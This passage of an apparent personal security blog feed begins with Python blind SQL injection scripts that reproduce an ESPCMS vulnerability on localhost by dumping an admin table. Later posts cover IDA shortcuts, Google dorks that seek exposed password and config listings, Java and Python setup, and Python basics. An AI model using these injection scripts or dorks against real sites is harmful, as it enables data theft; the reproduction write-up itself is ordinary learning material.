class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>column_length <span class="token operator">=</span> <span class="token number">2</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span>column_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> column_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct column_name frfromom information_schema.columns whwhereere table_name=%2527{0}%2527 limit 0,1),{1}, 1))={2} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>table_name<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            column_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment"># id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆值的长度"><a href="#爆值的长度" class="headerlink" title="爆值的长度"></a>爆值的长度</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>column_name <span class="token operator">=</span> <span class="token string">'id'</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">r'or (seleselectct length({0}) frfromom {1} limit 0,1)={2} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> table_name<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) "</span>key_length <span class="token operator">=</span> <span class="token number">1</span>column_name <span class="token operator">=</span> <span class="token string">"id"</span>table_name <span class="token operator">=</span> <span class="token string">'xxxxxxxadmin_member'</span>key_name <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> key_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">r'or ascii(substr((seleselectct {0} frfromom {1} limit 0,1),{2},1))={3} %23'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>column_name<span class="token punctuation">,</span> table_name<span class="token punctuation">,</span> i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"暂无内容"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            key_name <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>key_name<span class="token punctuation">)</span><span class="token comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看表中数据相符，这就是整个流程，当然可以直接放在sqlmap里跑</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA使用教程</title>
      <link href="/2021/11/23/ida-shi-yong-jiao-cheng/"/>
      <url>/2021/11/23/ida-shi-yong-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA使用教程"><a href="#IDA使用教程" class="headerlink" title="IDA使用教程"></a>IDA使用教程</h1><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><table><thead><tr><th>空格键</th><th>切换视图</th></tr></thead><tbody><tr><td>ESC</td><td>返回上一次操作</td></tr><tr><td>C</td><td>切换为代码</td></tr><tr><td>D</td><td>切换为数据</td></tr><tr><td>A</td><td>切换为ascii字符串</td></tr><tr><td>U</td><td>取消定义函数，代码，数据的定义</td></tr><tr><td>G</td><td>搜索地址跳转</td></tr><tr><td>N</td><td>重命名</td></tr><tr><td>Y</td><td>更改变量类型</td></tr><tr><td>X</td><td>查看函数，变量的交叉引用</td></tr><tr><td>:</td><td>注释</td></tr><tr><td>;</td><td>重复注释</td></tr><tr><td>Shift+F12</td><td>打开Strings窗口</td></tr><tr><td>Alt+M</td><td>添加标签</td></tr><tr><td>Ctrl+M</td><td>查看标签</td></tr><tr><td>Ctrl+S</td><td>查看段信息</td></tr><tr><td>Ctrl+W</td><td>保存IDA数据库</td></tr><tr><td>Alt+T</td><td>搜索文本</td></tr><tr><td>Alt+B</td><td>搜索16进制文本</td></tr><tr><td>Ctrl+Shift+W</td><td>拍摄快照</td></tr><tr><td>F5</td><td>反汇编</td></tr><tr><td>F12</td><td>函数流程图</td></tr><tr><td>Ctrl+F12</td><td>函数调用图</td></tr><tr><td>Alt+D</td><td>设置数据类型</td></tr><tr><td>Shift+F1</td><td>查看本地导入的类型</td></tr></tbody></table><h2 id="函数名称"><a href="#函数名称" class="headerlink" title="函数名称"></a>函数名称</h2><table><thead><tr><th>蓝色</th><th>常规的指令函数</th></tr></thead><tbody><tr><td>黑色</td><td>节和节之间的间隙</td></tr><tr><td>白色</td><td>数据内容</td></tr><tr><td>粉色</td><td>外部导入符号</td></tr><tr><td>暗黄色</td><td>IDA为识别的内容</td></tr></tbody></table><h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><table><thead><tr><th>IDA View</th><th>两种视图，图形，文本，空格键切换</th></tr></thead><tbody><tr><td>Hex View</td><td>16进制窗口，和winhex长得差不多</td></tr><tr><td>Structures</td><td>结构体窗口</td></tr><tr><td>Enums</td><td>枚举窗口</td></tr><tr><td>Imports</td><td>导入函数</td></tr><tr><td>Exports</td><td>导出函数</td></tr><tr><td>Strings</td><td>字符串窗口</td></tr></tbody></table><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p><img src="https://images.dadream.eu.org/images/2024/07/bd562363d89f53a31e13b12475f31e0a.png"></p><ol><li>最前面一列的地址</li><li>IDA自动为你加上语句的注释</li><li>16进制显示</li></ol><h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><p>选中想要转换成数组的数据块，Edit-&gt;Array</p><p><img src="https://images.dadream.eu.org/images/2024/07/66499b9a3845aa6e1e8352929d7c7e02.png"></p><h3 id="创建结构体"><a href="#创建结构体" class="headerlink" title="创建结构体"></a>创建结构体</h3><p>进入Structures窗口，右键hide/unhide，查看隐藏结构体，insert创建结构体</p><p>D创建结构体数据，delete删除结构体</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>google hacking 使用</title>
      <link href="/2021/11/22/google-hacking/"/>
      <url>/2021/11/22/google-hacking/</url>
      
        <content type="html"><![CDATA[<h1 id="google-hacking-使用"><a href="#google-hacking-使用" class="headerlink" title="google hacking 使用"></a>google hacking 使用</h1><h2 id="匹配方式"><a href="#匹配方式" class="headerlink" title="匹配方式"></a>匹配方式</h2><ol><li><code>"test"</code>全部匹配</li><li><code>test and text</code>逻辑与全匹配</li><li><code>test or text</code>逻辑或匹配一个或多个</li><li><code>-test</code>逻辑非不匹配</li><li><code>+ * ?</code>通配符</li><li><code>1..3</code>匹配数字范围</li></ol><h2 id="匹配关键字"><a href="#匹配关键字" class="headerlink" title="匹配关键字"></a>匹配关键字</h2><ol><li><code>intitle:test</code>只匹配标题中包含关键字的网页</li><li><code>allintitle:test text</code>只匹配标题中包含关键字的网页，匹配任意一个，相当于or</li><li><code>inurl:test</code>只匹配url中包含关键字的网页</li><li><code>allinurl:test text</code>只匹配url中包含关键字的网页，匹配任意一个，相当于or</li><li><code>intext:test</code>只匹配正文中包含关键字的网页</li><li><code>allintext:test text</code>只匹配正文中包含关键字的网页，匹配任意一个，相当于or</li><li><code>inanchor:test</code>只匹配带超链接的锚文字中包含关键字的页面</li><li><code>allinanchor:test text</code>只匹配带超链接的锚文字中包含关键字的网页，匹配任意一个，相当于or</li></ol><h2 id="匹配指定链接"><a href="#匹配指定链接" class="headerlink" title="匹配指定链接"></a>匹配指定链接</h2><ol><li><code>site:url</code>匹配指定url的网页</li><li><code>-site:url</code>不匹配指定url的网页</li><li><code>link:url</code>匹配链接到指定url上的网页</li><li><code>cache:url</code>匹配url下储存的网页缓存</li><li><code>related:url</code>匹配与url相似的网页</li><li><code>info:url</code>匹配指定站点的网页</li></ol><h2 id="匹配类型"><a href="#匹配类型" class="headerlink" title="匹配类型"></a>匹配类型</h2><ol><li><code>filetype:pdf</code>匹配指定访问的文件类型</li></ol><h2 id="匹配目录"><a href="#匹配目录" class="headerlink" title="匹配目录"></a>匹配目录</h2><ul><li>index of /admin</li><li>index of /passwd</li><li>index of /password</li><li>index of /mail</li><li>“index of /“ +passwd</li><li>“index of /“ +password.txt</li><li>“index of /“ +.htaccess</li><li>“index of /root”</li><li>“index of /cgi-bin”</li><li>“index of /logs”</li><li>“index of /config”</li></ul>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安装</title>
      <link href="/2021/11/06/java-an-zhuang/"/>
      <url>/2021/11/06/java-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="java安装"><a href="#java安装" class="headerlink" title="java安装"></a>java安装</h1><ol><li><p>前往<a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a>下载合适自己计算机版本的JDK</p></li><li><p>一直Next，遇到修改路径自行修改</p></li><li><p>安装成功后，添加环境变量，win+R ，输入contro打开控制面板，系统和安全-&gt;系统-&gt;高级系统设置-&gt;环境变量</p><p>添加两个系统变量<code>CLASSPATH = .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/9d27d5425c82b6e5da65577583b1bca5.png"><code>JAVA_HOME = 你的安装目录</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/36124fb3c93ef24856dffc4c65bb73ff.png">添加至Path</p><p><img src="https://images.dadream.eu.org/images/2024/07/f0563e12878361dcba1998db038a1723.png"></p></li><li><p>至此已经成功了，运行<code>java</code>，<code>javac</code>，<code>java --version</code>正常则安装成功</p><p><img src="https://images.dadream.eu.org/images/2024/07/96b66c41a6ce153d420f2d16c20aa0c8.png"></p></li></ol><p>jdk：Java Development Kit，是开发者使用的</p><p>jre： Java Runtime Environment，用来运行java</p><p>注：</p><ol><li><p>jdk集成安装了jre，有些时候jre会没安装，可以到<a href="https://www.java.com/en/download/manual.jsp">Java Downloads for All Operating Systems</a>下载安装包自己安装，当然单独安装jre也行</p></li><li><p>Oracle管理的jdk和jre不用上述的添加环境变量，它会自己添加</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python安装</title>
      <link href="/2021/11/06/python-an-zhuang/"/>
      <url>/2021/11/06/python-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows下安装python"><a href="#Windows下安装python" class="headerlink" title="Windows下安装python"></a>Windows下安装python</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>安装包下载，<a href="https://www.python.org/downloads/windows/">Python Releases for Windows | Python.org</a>，根据自己计算机的配置选择合适版本安装，我选择了一个3.8.8的版本测试</p></li><li><p>双击开始安装</p><p><img src="https://images.dadream.eu.org/images/2024/07/db93018a35a4cbb5f0d721d791cde78d.png"></p></li></ol><p>可以直接选择Install Now，建议选择下面自定义路径方便管理，勾选Add Path，Next，Next</p><p><img src="https://images.dadream.eu.org/images/2024/07/294ff70828ba5b135919baa57679348f.png"></p><p>勾选如图选项，路径自选，Install（除默认的也可以不选）</p><ol start="3"><li><p>安装成功后，win+R ，输入cmd运行命令行，运行命令<code>python -V</code>，<code>pip -V</code>，显示版本则安装成功</p></li><li><p>若没点Add Path 可以重新装，点击安装包，或者自行添加</p><p>win+R ，输入contro打开控制面板，系统和安全-&gt;系统-&gt;高级系统设置-&gt;环境变量</p><p>添加如下</p><p><img src="https://images.dadream.eu.org/images/2024/07/01a0f7aae246452754a2d3c6e3d20dd5.png"></p></li></ol><h2 id="安装多个不同版本"><a href="#安装多个不同版本" class="headerlink" title="安装多个不同版本"></a>安装多个不同版本</h2><p>按照上述安装步骤选择几个不同版本的安装</p><p>已安装两个为例，我安装了一个2.x和3.x版本的</p><p><img src="https://images.dadream.eu.org/images/2024/07/152407932b02733a7a503903a7e297d6.png"></p><p>进入一个目录，复制<code>python.exe</code>，<code>pythonw.exe</code>两个文件，并且重命名，调用时就是用你重命的名，可以随时改，下图为结果</p><p><img src="https://images.dadream.eu.org/images/2024/07/6ff4d0fb58245efa994e4206e916d191.png"></p><p>进入Scripts</p><p>正常应该是存在两个文件（<code>pip.exe</code>、<code>pipx.exe</code>），如没有后者，自己复制改一个，用上述命令测试时候成功</p><p>其他的版本一个意思，我一般会留一个不改，直接用<code>python</code>调用当做主用版本，毕竟少打一个字母……</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习</title>
      <link href="/2021/10/10/python-study/"/>
      <url>/2021/10/10/python-study/</url>
      
        <content type="html"><![CDATA[<h1 id="python学习"><a href="#python学习" class="headerlink" title="python学习"></a>python学习</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><ol><li>首字母必须是字母或者下划线<code>_</code></li><li>其他部分由字母、数字、下划线组成</li><li>大小写敏感</li><li>python3 可中文也可非ASCII标识符</li></ol><h3 id="python保留字"><a href="#python保留字" class="headerlink" title="python保留字"></a>python保留字</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> keyword<span class="token keyword">print</span><span class="token punctuation">(</span>keyword<span class="token punctuation">.</span>kwlist<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'as'</span><span class="token punctuation">,</span> <span class="token string">'assert'</span><span class="token punctuation">,</span> <span class="token string">'async'</span><span class="token punctuation">,</span> <span class="token string">'await'</span><span class="token punctuation">,</span> <span class="token string">'break'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'continue'</span><span class="token punctuation">,</span> <span class="token string">'def'</span><span class="token punctuation">,</span> <span class="token string">'del'</span><span class="token punctuation">,</span> <span class="token string">'elif'</span><span class="token punctuation">,</span> <span class="token string">'else'</span><span class="token punctuation">,</span> <span class="token string">'except'</span><span class="token punctuation">,</span> <span class="token string">'finally'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span> <span class="token string">'from'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'in'</span><span class="token punctuation">,</span> <span class="token string">'is'</span><span class="token punctuation">,</span> <span class="token string">'lambda'</span><span class="token punctuation">,</span> <span class="token string">'nonlocal'</span><span class="token punctuation">,</span> <span class="token string">'not'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">,</span> <span class="token string">'raise'</span><span class="token punctuation">,</span> <span class="token string">'return'</span><span class="token punctuation">,</span> <span class="token string">'try'</span><span class="token punctuation">,</span> <span class="token string">'while'</span><span class="token punctuation">,</span> <span class="token string">'with'</span><span class="token punctuation">,</span> <span class="token string">'yield'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>python中<code>'</code>和<code>"</code>一样</p><pre class="line-numbers language-none"><code class="language-none">#单行注释'''多行注释'''"""多行注释"""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><p>python不使用大括号，使用缩进对齐</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> expression <span class="token punctuation">:</span>    XXX<span class="token keyword">else</span> <span class="token punctuation">:</span>    XXX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多行连接"><a href="#多行连接" class="headerlink" title="多行连接"></a>多行连接</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> \ <span class="token number">2</span> <span class="token operator">+</span> \    <span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token comment">#6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>python中数字有四种类型：整数、布尔型、浮点数和复数</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><ol><li>python中单引号、双引号使用完全相同</li><li>转义字符<code>\</code></li><li><code>r'test\ntest'</code>，<code>r</code>可以使<code>\n</code>不转义</li><li><code>"this " "is " "string"</code>输出<code>this is string</code></li><li><code>+</code>运算符连接字符，<code>*</code>运算符重复字符</li><li>检索从左到右从0开始，从右到左从-1开始</li><li>一个字符就是一个长度为1的字符串</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token string">"this "</span> <span class="token string">"is "</span> <span class="token string">"string"</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token comment"># this is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># this is stringthis is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var <span class="token operator">+</span> <span class="token string">'111'</span><span class="token punctuation">)</span><span class="token comment"># this is string111</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ssss\nsssss'</span><span class="token punctuation">)</span><span class="token comment"># ssss</span><span class="token comment"># sssss</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">r"ssss\nssss"</span><span class="token punctuation">)</span><span class="token comment"># ssss\nssss</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># this is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># this is string</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># this is strin</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># ti ssrn</span><span class="token triple-quoted-string string">'''this is stringthis is stringthis is stringthis is string111sssssssssssss\nssssthis is stringthis is stringthis is strinti ssrn'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一行多条语句"><a href="#一行多条语句" class="headerlink" title="一行多条语句"></a>一行多条语句</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">;</span> x <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">;</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''test'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多个语句组成代码组"><a href="#多个语句组成代码组" class="headerlink" title="多个语句组成代码组"></a>多个语句组成代码组</h3><p>首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> expression <span class="token punctuation">:</span>    suite<span class="token keyword">elif</span> expression <span class="token punctuation">:</span>    suite <span class="token keyword">else</span> <span class="token punctuation">:</span>    suite<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token string">'test'</span><span class="token comment"># 换行输出</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'---------'</span><span class="token punctuation">)</span><span class="token comment"># 不换行输出</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>  <span class="token comment"># 以空格分隔</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''test1---------test 1 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>在 python 用 <strong>import</strong> 或者 <strong>from…import</strong> 来导入相应的模块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> sys <span class="token keyword">import</span> argv<span class="token punctuation">,</span>path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>python的变量就是对象</p><p>python变量直接赋值，不需要声明</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">1</span>b <span class="token operator">=</span> <span class="token number">1.2</span>c <span class="token operator">=</span> <span class="token string">'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="多个变量赋值"><a href="#多个变量赋值" class="headerlink" title="多个变量赋值"></a>多个变量赋值</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> b <span class="token operator">=</span>c <span class="token operator">=</span><span class="token number">1</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="不可变数据"><a href="#不可变数据" class="headerlink" title="不可变数据"></a>不可变数据</h3><h4 id="Number-数字"><a href="#Number-数字" class="headerlink" title="Number(数字)"></a>Number(数字)</h4><p>支持int、float、bool、complex（复数）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5.5</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">3j</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''&lt;class 'int'&gt; &lt;class 'float'&gt; &lt;class 'bool'&gt; &lt;class 'complex'&gt;'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>type()</code>函数查询变量的类型</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">111</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''True'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>isinstance(x,x)</code>对比对象类型</p><ul><li><code>type()</code>不会认为子类是一种父类类型</li><li><code>isinstance()</code>会认为子类是一种父类类型</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token 